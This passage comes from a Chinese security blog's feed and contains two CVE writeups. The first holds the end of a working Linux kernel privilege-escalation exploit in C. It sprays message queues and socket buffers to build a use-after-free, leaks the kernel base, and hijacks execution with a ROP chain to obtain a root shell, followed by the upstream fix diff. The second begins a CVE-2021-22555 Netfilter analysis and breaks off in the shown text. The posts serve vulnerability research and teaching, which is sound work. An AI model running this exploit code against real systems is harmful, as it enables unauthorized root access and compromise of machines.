class="hljs-keyword">sizeof</span>(secondary_msg));<br><br>    <span class="hljs-comment">// spray primary and secondary message</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        *(<span class="hljs-type">int</span> *)&amp;primary_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;primary_msg.mtext[<span class="hljs-number">4</span>] = i;<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i], &amp;primary_msg, <br>                <span class="hljs-keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to send primary msg!&quot;</span>);<br><br>        *(<span class="hljs-type">int</span> *)&amp;secondary_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;secondary_msg.mtext[<span class="hljs-number">4</span>] = i;<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to send secondary msg!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// create hole in primary msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Create holes in primary msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="hljs-number">1024</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (readMsg(msqid[i], &amp;primary_msg, <br>                <span class="hljs-keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to receive primary msg!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// triger off-by-null on primary msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Trigger OOB write to construct the overlapping...&quot;</span>);<br>    trigerOutOfBoundWrite(oob_pipe_fd);<br><br>    <span class="hljs-comment">// find the queues that have the same secondary msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Checking whether succeeded to make overlapping...&quot;</span>);<br>    victim_qid = real_qid = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> ((i % <span class="hljs-number">1024</span>) == <span class="hljs-number">0</span>)  <span class="hljs-comment">// the hole</span><br>            <span class="hljs-keyword">continue</span>;<br><br>        <span class="hljs-keyword">if</span> (peekMsg(msqid[i], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error qid: %d\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">0</span>] != MSG_TAG)<br>            errExit(<span class="hljs-string">&quot;failed to make corruption!&quot;</span>);<br>        <br>        <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">4</span>] != i)<br>        &#123;<br>            victim_qid = i;<br>            real_qid = *(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">4</span>];<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (victim_qid &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to make overlapping!&quot;</span>);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] victim qid:\033[0m %d \033[32m\033[1m real qid: \033[0m %d\n&quot;</span>, <br>            victim_qid, real_qid);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.II</span><br><span class="hljs-comment">     * construct UAF</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.II construct UAF\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// free the victim secondary msg_msg, then we get a UAF</span><br>    <span class="hljs-keyword">if</span> (readMsg(msqid[real_qid], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.III</span><br><span class="hljs-comment">     * spray sk_buff to leak msg_msg addr</span><br><span class="hljs-comment">     * construct fake msg_msg to leak addr of UAF obj</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// spray sk_buff to construct fake msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff...&quot;</span>);<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            VICTIM_MSG_TYPE, <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-comment">// use fake msg_msg to read OOB</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] OOB read from victim msg_msg&quot;</span>);<br>    <span class="hljs-keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to read victim msg!&quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)<br>        errExit(<span class="hljs-string">&quot;failed to rehit the UAF object!&quot;</span>);<br><br>    nearby_msg = (<span class="hljs-keyword">struct</span> msg_msg*) <br>            &amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%llx\n&quot;</span>, <br>            nearby_msg-&gt;m_list.prev);<br><br>    <span class="hljs-comment">// release and re-spray sk_buff to construct fake msg_msg</span><br>    <span class="hljs-comment">// so that we can make an arbitrary read on a primary msg_msg</span><br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    <br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            VICTIM_MSG_TYPE, <span class="hljs-keyword">sizeof</span>(oob_msg.mtext), <br>            nearby_msg-&gt;m_list.prev - <span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);<br>    <span class="hljs-keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to read victim msg!&quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[<span class="hljs-number">0x1000</span>] != MSG_TAG)<br>        errExit(<span class="hljs-string">&quot;failed to rehit the UAF object!&quot;</span>);<br>    <br>    <span class="hljs-comment">// cal the addr of UAF obj by the header we just read out</span><br>    nearby_msg_prim = (<span class="hljs-keyword">struct</span> msg_msg*) <br>            &amp;oob_msg.mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="hljs-number">0x400</span>;<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n&quot;</span>, <br>            nearby_msg_prim-&gt;m_list.next);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n&quot;</span>, victim_addr);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.IV</span><br><span class="hljs-comment">     * fix the header of UAF obj and release it</span><br><span class="hljs-comment">     * spray pipe_buffer and leak the kernel base</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// re-construct the msg_msg to fix it</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fixing the UAF obj as a msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">memset</span>(fake_secondary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(fake_secondary_msg));<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            victim_addr + <span class="hljs-number">0x800</span>, victim_addr + <span class="hljs-number">0x800</span>, <span class="hljs-comment">// a valid kheap addr is valid</span><br>            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <br>            <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-comment">// release UAF obj as secondary msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] release UAF obj in message queue...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (readMsg(msqid[victim_qid], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>    <br>    <span class="hljs-comment">// spray pipe_buffer</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create pipe!&quot;</span>);<br>        <br>        <span class="hljs-comment">// write something to activate it</span><br>        <span class="hljs-keyword">if</span> (write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to write the pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// release the sk_buff to read pipe_buffer, leak kernel base</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] release sk_buff to read pipe_buffer...&quot;</span>);<br>    pipe_buf_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *) &amp;fake_secondary_msg;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (read(sk_sockets[i][<span class="hljs-number">1</span>], &amp;fake_secondary_msg, <br>                    <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>                errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>            <br>            <span class="hljs-keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="hljs-number">0xffffffff81000000</span>)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n&quot;</span>, <br>                        pipe_buf_ptr-&gt;ops);<br>                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;<br>                kernel_base = <span class="hljs-number">0xffffffff81000000</span> + kernel_offset;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n&quot;</span>, <br>            kernel_base, kernel_offset);<br>    <br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.V</span><br><span class="hljs-comment">     * hijack the ops of pipe_buffer</span><br><span class="hljs-comment">     * free all pipe to trigger fake ptr</span><br><span class="hljs-comment">     * so that we hijack the RIP</span><br><span class="hljs-comment">     * construct a ROP on pipe_buffer</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.V hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pre-construct data in userspace...&quot;</span>);<br>    pipe_buf_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *) fake_secondary_msg;<br>    pipe_buf_ptr-&gt;ops = victim_addr;<br><br>    ops_ptr = (<span class="hljs-keyword">struct</span> pipe_buf_operations *) fake_secondary_msg;<br>    ops_ptr-&gt;release = <span class="hljs-number">0xffffffff8183b4d3</span> + kernel_offset;<span class="hljs-comment">// push rsi ; pop rsp ; add [rbp-0x3d],bl ; ret</span><br>    ops_ptr-&gt;confirm = <span class="hljs-number">0xffffffff81689ea4</span> + kernel_offset;<span class="hljs-comment">// pop rdx ; pop r13 ; pop rbp ; ret</span><br><br>    rop_idx = <span class="hljs-number">0</span>;<br>    rop_chain = (<span class="hljs-type">uint64_t</span>*) &amp;fake_secondary_msg[<span class="hljs-number">0x20</span>];<br>    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;<br>    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;<br>    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;<br>    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="hljs-number">22</span>;<br>    rop_chain[rop_idx++] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[rop_idx++] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[rop_idx++] = getRootShell;<br>    rop_chain[rop_idx++] = user_cs;<br>    rop_chain[rop_idx++] = user_rflags;<br>    rop_chain[rop_idx++] = user_sp;<br>    rop_chain[rop_idx++] = user_ss;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff to hijack pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_NUM; i++)<br>    &#123;<br>        close(pipe_fd[i][<span class="hljs-number">0</span>]);<br>        close(pipe_fd[i][<span class="hljs-number">1</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行即可完成提权</p><p><img src="https://s2.loli.net/2022/04/06/Fk975jsZhPfvyCJ.png" alt="image.png"></p><h1>0x03.漏洞修复</h1><p>该漏洞在内核主线的 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=93ce93587d36493f2f86921fa79921b3cba63fbb">这个 commit</a> 中被修复，这个 commit 增加的修改比较多，我们主要关注对于该漏洞其改变的部分：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-meta">@@ -320,7 +319,7 @@</span> long watch_queue_set_filter(struct pipe_inode_info *pipe,<br>     tf[i].info_mask &amp; WATCH_INFO_LENGTH)<br> goto err_filter;<br> /* Ignore any unknown types */<br><span class="hljs-deletion">-if (tf[i].type &gt;= sizeof(wfilter-&gt;type_filter) * 8)</span><br><span class="hljs-addition">+if (tf[i].type &gt;= WATCH_TYPE__NR)</span><br> continue;<br> nr_filter++;<br> &#125;<br><span class="hljs-meta">@@ -336,7 +335,7 @@</span> long watch_queue_set_filter(struct pipe_inode_info *pipe,<br> <br> q = wfilter-&gt;filters;<br> for (i = 0; i &lt; filter.nr_filters; i++) &#123;<br><span class="hljs-deletion">-if (tf[i].type &gt;= sizeof(wfilter-&gt;type_filter) * BITS_PER_LONG)</span><br><span class="hljs-addition">+if (tf[i].type &gt;= WATCH_TYPE__NR)</span><br> continue;<br> <br> q-&gt;type= tf[i].type;<br></code></pre></td></tr></table></figure><ul><li>修复了前后判定不一致的问题</li><li>将 type 的范围限定为 <code>WATCH_TYPE__NR</code>（值为 2）</li></ul><p>笔者个人认为这个修复还是比较成功的</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;我在看着你👁_👁&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/categories/CVE/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/tags/CVE/"/>
    
    <category term="提权" scheme="http://blog.arttnba3.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>【CVE.0x07】CVE-2021-22555 漏洞复现及简要分析</title>
    <link href="http://blog.arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/"/>
    <id>http://blog.arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/</id>
    <published>2022-03-31T16:18:06.000Z</published>
    <updated>2023-01-12T07:37:02.505Z</updated>
    
    <content type="html"><![CDATA[<p><s>喷子永远是版本答案</s></p><span id="more"></span><h1>0x00.一切开始之前</h1><p>CVE-2021-22555 是 Linux Netfilter 模块中的一个堆溢出漏洞，漏洞主要发生在64 位系统上为 32 位进程处理 setsockopt 时，若指定了 optname 为 <code>IPT_SO_SET_REPLACE</code>（或 <code>IP6T_SO_SET_REPLACE</code>），且开启了内核选项 <code>CONFIG_USER_NS</code> 、<code>CONFIG_NET_NS</code>，在内核结构转换时由于错误计算转换大小则会导致内核堆上的越界写入一些 0 字节，从而覆写相邻 object</p><p>该漏洞自内核版本 <code>v2.6.19-rc1</code> （<code>9fa492cdc160cd27ce1046cb36f47d3b2b1efa21</code>）引入，在这些版本中被修复：</p><ul><li><code>5.12 (b29c457a6511435960115c0f548c4360d5f4801d), 5.10.31, 5.4.113, 4.19.188, 4.14.231, 4.9.267, 4.4.267</code></li></ul><p>由于其影响范围极大，且利用较为简单，故获得了 <code>7.8</code> 的 CVSS 评分</p><p>在开始分析之前，我们先来补充一些前置知识</p><blockquote><p>本文主要参考了 bsauce 大师傅对该漏洞的分析与利用过程：<a href="https://www.anquanke.com/post/id/254027">https://www.anquanke.com/post/id/254027</a></p><p>本文中涉及到的内核源码为 <code>5.8</code> 版本</p></blockquote><h2 id="内核编译选项"><em>内核编译选项</em></h2><p>首先是所有 <code>CONFIG_IP_NF_**</code> 和 <code>CONFIG_NETFILTER_**</code> 相关的选项都要打开</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs makefile">CONFIG_IP_NF_IPTABLES=y<br>CONFIG_IP_NF_MATCH_AH=y<br>CONFIG_IP_NF_MATCH_ECN=y<br>CONFIG_IP_NF_MATCH_RPFILTER=y<br>CONFIG_IP_NF_MATCH_TTL=y<br>CONFIG_IP_NF_FILTER=y<br>CONFIG_IP_NF_TARGET_REJECT=y<br>CONFIG_IP_NF_TARGET_SYNPROXY=y<br>CONFIG_IP_NF_NAT=y<br>CONFIG_IP_NF_TARGET_MASQUERADE=y<br>CONFIG_IP_NF_TARGET_NETMAP=y<br>CONFIG_IP_NF_TARGET_REDIRECT=y<br>CONFIG_IP_NF_MANGLE=y<br>CONFIG_IP_NF_TARGET_CLUSTERIP=y<br>CONFIG_IP_NF_TARGET_ECN=y<br>CONFIG_IP_NF_TARGET_TTL=y<br>CONFIG_IP_NF_RAW=y<br>CONFIG_IP_NF_SECURITY=y<br>CONFIG_IP_NF_ARPTABLES=y<br>CONFIG_IP_NF_ARPFILTER=y<br>CONFIG_IP_NF_ARP_MANGLE=y<br><br>CONFIG_NETFILTER=y<br>CONFIG_NETFILTER_ADVANCED=y<br><br>CONFIG_NETFILTER_INGRESS=y<br>CONFIG_NETFILTER_NETLINK=y<br>CONFIG_NETFILTER_FAMILY_BRIDGE=y<br>CONFIG_NETFILTER_FAMILY_ARP=y<br>CONFIG_NETFILTER_NETLINK_ACCT=y<br>CONFIG_NETFILTER_NETLINK_QUEUE=y<br>CONFIG_NETFILTER_NETLINK_LOG=y<br>CONFIG_NETFILTER_NETLINK_OSF=y<br><br>CONFIG_NETFILTER_CONNCOUNT=y<br><br>CONFIG_NETFILTER_NETLINK_GLUE_CT=y<br><br>CONFIG_NETFILTER_SYNPROXY=y<br><br>CONFIG_NETFILTER_XTABLES=y<br><br>CONFIG_NETFILTER_XT_MARK=y<br>CONFIG_NETFILTER_XT_CONNMARK=y<br>CONFIG_NETFILTER_XT_SET=y<br><br>CONFIG_NETFILTER_XT_MATCH_U32=y<br><span class="hljs-comment"># 挺多的，这里笔者就不一一摘录了</span><br></code></pre></td></tr></table></figure><p>以及三个其他选项：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile">CONFIG_USER_NS=y<br>CONFIG_NET_NS=y<br>CONFIG_COMPAT=y<br></code></pre></td></tr></table></figure><h2 id="Netfilter">Netfilter</h2><p>Netfilter 为 Linux 内核中的一个子模块，用以提供数据包过滤、网络地址转换、端口转换等功能，其整体框架如下图所示</p><p><img src="https://s2.loli.net/2022/03/28/SFpO9z7YRykLnqU.png" alt="Netfilter components"></p><p>例如 <code>iptables</code> 等工具便是利用 Netfilter 所提供的接口实现的，不过本篇我们主要关注其在内核中的部分</p><p>Netfilter 涵盖了内核网络协议栈的多层，一个数据包在 Netfilter 中的历程如下图所示：</p><p><img src="https://s2.loli.net/2022/03/28/8UnfDE7Mry1uhgW.png" alt="image.png"></p><p>在 Netfilter 中有一种名为 「table」 的结构，用以存储不同功能的配置信息，在内核当中使用 <code>xt_table</code> 结构表示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Furniture shopping... */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_table</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><br><br><span class="hljs-comment">/* What hooks you will enter on */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> valid_hooks;<br><br><span class="hljs-comment">/* Man behind the curtain... */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_table_info</span> *<span class="hljs-title">private</span>;</span><br><br><span class="hljs-comment">/* Set this to THIS_MODULE if you are a module, otherwise NULL */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">module</span> *<span class="hljs-title">me</span>;</span><br><br><span class="hljs-type">u_int8_t</span> af;<span class="hljs-comment">/* address/protocol family */</span><br><span class="hljs-type">int</span> priority;<span class="hljs-comment">/* hook order */</span><br><br><span class="hljs-comment">/* called when table is needed in the given netns */</span><br><span class="hljs-type">int</span> (*table_init)(<span class="hljs-keyword">struct</span> net *net);<br><br><span class="hljs-comment">/* A unique name... */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> name[XT_TABLE_MAXNAMELEN];<br>&#125;;<br></code></pre></td></tr></table></figure><p>该结构其实是一层 wrapper，其核心结构为 <code>xt_table_info</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 